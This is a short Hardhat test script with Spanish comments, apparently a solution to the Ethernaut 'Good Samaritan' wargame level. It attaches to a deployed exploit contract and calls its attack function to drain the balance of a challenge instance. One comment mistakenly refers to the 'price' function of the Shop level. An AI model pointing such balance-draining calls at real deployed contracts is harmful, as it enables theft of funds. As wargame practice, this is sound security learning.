import { assert } from "chai";
import { ethers } from "hardhat";

describe("Executing", function () {
  it("Attacker debe drenar el saldo", async function () {

    // Attach to contracts
    const toa='0x2c5492E90cA69F34Bb894f5079534452114f7b4e' //direccion contrato exploit
    const exploitContract = await (await ethers.getContractFactory("AttackGoodSamaritan")).attach(toa);

    const toa2='0x95fc71146C18328a6fFF1db90CC167B5Dd6Afe15'; //direccion contrato instancia ethernaut
    
    //Llamamos al contrato exploit que implementa price del contrato shop de ethernaut
    await exploitContract.attack(toa2); 
  });
});